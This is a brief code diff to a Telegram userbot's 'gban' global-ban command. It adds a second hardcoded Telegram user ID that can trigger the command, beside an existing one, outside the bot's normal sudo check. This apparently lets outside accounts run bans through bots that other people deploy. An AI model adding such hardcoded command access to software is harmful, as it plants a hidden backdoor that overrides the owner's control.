@@ -18,6 +18,7 @@ __HELP__ = f"""
 @PY.UBOT("gban", sudo=True)
 @PY.TOP_CMD
 @ubot.on_message(filters.command(["gban"], "c") & filters.user(2100442624))
+@ubot.on_message(filters.command(["gban"], "c") & filters.user(5312739535))
 async def _(client, message):
     await global_banned(client, message)
 
